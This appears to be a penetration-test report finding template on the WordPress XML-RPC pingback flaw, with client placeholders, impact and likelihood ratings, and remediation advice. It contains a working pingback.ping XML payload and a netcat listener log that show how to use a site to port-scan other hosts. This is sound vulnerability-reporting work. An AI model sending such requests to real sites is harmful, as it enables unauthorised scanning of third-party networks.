### WordPress XML-RPC Pingback Vulnerability
The WordPress XML-RPC interface available at the following URL{s||} can be abused to carry out port scans of external and internal networks. This vulnerability arises as versions of WordPress prior to 3.5.1 will attempt to resolve the source address of any pingbacks added via the XML-RPC interface, in order to verify that the address resolves to a valid pingback, and does not sufficiently restrict the protocols or port numbers used in the provided source.

An attacker can exploit this to map servers and available ports or to launch a port scan against a third party that would appear to originate from {==CLIENTNAME==}.

The following example shows a request that could be made using the XML-RPC interface to target the Dionach server at {==213.230.207.20==}:

POST http://SITE/xmlrpc.php

```
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value>
<string>{==http://213.230.207.20/dntest?k=v==}</string>
</value>
</param>
<param>
<value>
<string>{==http://SITE/VALIDWORDPRESSPAGE==}</string>
</value>
</param>
</params>
</methodCall>
```

A netcat listener running on the Dionach server shows a successful connection attempt from the website host, as shown below:

```
# nc -v -l -p 80
<...>
connect to [{==213.230.207.20==}] from {==CLIENTSERVERNAME==} [{==CLIENTSERVERIP==}] 36032
GET {==/dntest?k=v==} HTTP/1.0
<...>
```

An attacker can then analyse the returned error codes, an example of which is should below, in order to determine whether a server is listening on the target host.

http://SITE/xmlrpc.php
```
<...>
<name>faultString</name>
<value><string>The source URL does not exist.</string></value>
<...>
```

#### Impact: High
An attacker may exploit this issue to perform a port scan of third-party systems using this vulnerability; such attacks would appear to originate from {==CLIENTNAME==} and could impact on {==CLIENTNAME's==} reputation. Additionally, should the website hosting provider detect this form of abuse, they may consider suspending the website until the issue can be resolved.
#### Likelihood: Medium
This is a well-known vulnerability and there are tools freely available online which can be used to automate the process of port scanning a particular target. An attacker would need to be motivated to target {==CLIENTNAME==} in this manner.
#### Recommendation
Update WordPress to the latest version, as discussed in section {==XREF==}. Additionally, if the XML-RPC interface is not required consider disabling it (see section {==XREF==}).
